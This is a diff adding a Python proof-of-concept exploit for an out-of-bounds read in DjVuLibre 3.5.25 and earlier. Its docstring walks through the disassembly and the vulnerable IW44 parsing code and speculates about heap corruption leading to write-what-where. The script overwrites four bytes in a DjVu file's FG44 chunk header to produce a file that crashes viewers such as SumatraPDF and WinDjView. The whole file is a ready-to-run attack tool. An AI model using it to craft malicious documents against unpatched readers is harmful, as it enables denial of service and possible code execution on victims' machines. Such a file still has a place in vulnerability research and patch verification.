@@ -1,0 +1,122 @@
+from shutil import copyfile
+import sys
+
+"""
+Exploit Title: DjVuLibre <= 3.5.25 Out of Bounds Access Violation
+Date: 07/14/24
+Exploit Author: drone (@dronesec)
+Vendor: http://djvu.sourceforge.net/
+Software link: http://downloads.sourceforge.net/djvu/djvulibre-3.5.25.3.tar.gz
+Version: <= 3.5.25.3
+Tested On: WinXP/Win7 
+Patch: https://sourceforge.net/p/djvu/djvulibre-git/ci/7993b445f071a15248bd4be788a10643213cb9d2/
+
+The crash occurs due to a out of bounds read 
+
+	.text:004D3BC0 mov     ecx, edx
+	.text:004D3BC2 and     ecx, 0Fh
+ =>	.text:004D3BC5 mov     eax, [eax+ecx*4]
+	.text:004D3BC8 test    eax, eax
+	.text:004D3BCA jnz     short loc_
+
+We overwrite 4 bytes in an FG44 chunk header with \xff\xff\xff\xff:
+
+	46 47 
+	34 34 00 00 04 6E 00 64 01 02 FF FF FF FF 80 FF 	<= 
+	F2 D9 81 5E 5C 51 12 AD 6B 27 14 29 F6 53 2B DD 
+	79 B0 01 E3 E2 71 33 58 CA 23 AE 25 35 E8 FF FF 
+	FF FF F5 BA 7A FA 45 39 C7 CD E0 76 93 FF FF FF 
+	FF FF F4 F1 85 98 84 DF 58 71 FE 2A 5F FF B7 16 
+	31 67 4E 93 F0 2D 20 D5 58 22 39 02 26 7E A6 03 
+
+The crash occurs during image parsing:
+	
+	// Allocate reconstruction buffer
+	short *data16;
+	GPBuffer<short> gdata16(data16,bw*bh);
+	// Copy coefficients
+	int i;
+	short *p = data16;
+	const IW44Image::Block *block = blocks;
+	for (i=0; i<bh; i+=32)
+	{
+	  for (int j=0; j<bw; j+=32)
+	    {
+	      short liftblock[1024];
+	      // transfer into IW44Image::Block (apply zigzag and scaling)
+	      block->write_liftblock(liftblock);
+
+	[...]
+
+	void  
+	IW44Image::Block::write_liftblock(short *coeff, int bmin, int bmax) const
+	{
+	  int n = bmin<<4;
+	  memset(coeff, 0, 1024*sizeof(short));
+	  for (int n1=bmin; n1<bmax; n1++)
+	    {
+	      const short *d = data(n1);
+
+	[....]
+
+	inline const short* 
+	IW44Image::Block::data(int n) const
+	{
+	  if (! pdata[n>>4])
+	    return 0;
+	  return pdata[n>>4][n&15];
+	}
+
+Which lines up quite nicely with our inlined disassembly of the function:
+
+	.text:004D3BB0 loc_4D3BB0:
+	.text:004D3BB0 mov     ecx, [esp+0Ch+arg_0]
+	.text:004D3BB4 mov     eax, edx
+	.text:004D3BB6 sar     eax, 4 			 ; [n>>4]
+	.text:004D3BB9 mov     eax, [ecx+eax*4]  ; our pdata[n] data after the bitwise shift, lets call it n2
+	.text:004D3BBC test    eax, eax  		 ; if(n2 == 0)
+	.text:004D3BBE jz      short loc_4       ; return 0
+	.text:004D3BC0 mov     ecx, edx
+	.text:004D3BC2 and     ecx, 0Fh			 ; apply n & 15, or pdata[n2][n&15], lets call it n3
+=>	.text:004D3BC5 mov     eax, [eax+ecx*4]  ; dereference pdata[n2][n3] into d
+	.text:004D3BC8 test    eax, eax  		 ; test if d == 0
+	.text:004D3BCA jnz     short loc_
+
+n2 refs to a location on the heap; may be exploitable if we stack Fg44 chunks with valid headers and malformed content, so the chunk
+is allocated, then free'd, and hopefully our pointer dips into one of those free'd chunks.  The returned short pointer is then used as the source in a 
+memcpy with a controllable destination; write-what-where.  Who knows.  
+
+Tested with SumatraPDF 2.5.2 and WinDjView 2.0.2
+"""
+
+if len(sys.argv) < 2:
+	print '[%s] <djvu file>' % sys.argv[0]
+	sys.exit(1)
+
+bfile = sys.argv[1]
+
+# read in the data for parsing
+base_data = None
+with open(bfile, "rb") as f:
+	base_data = f.read()
+
+# find a valid chunk
+chunk_idx = base_data.find("\x46\x47\x34\x34")
+if chunk_idx == -1:
+	print '[-] No valid FG44 chunks found'
+	sys.exit(1)
+
+copyfile(bfile, "./%s-dos.djvu" % bfile)
+
+print '[!] Found FG44 chunk at offset %d' % chunk_idx
+
+# overwrite
+with open("./%s-dos.djvu" % bfile, "r+b") as base:
+	# skip over 4 byte indicator (FG44)
+	#			2 byte primary header
+	#			2 byte secondary header
+	#			4 byte tertiary header
+	base.seek(chunk_idx+12)
+	base.write("\xff\xff\xff\xff")
+
+print '[!] %s-dos.djvu generated' % bfile
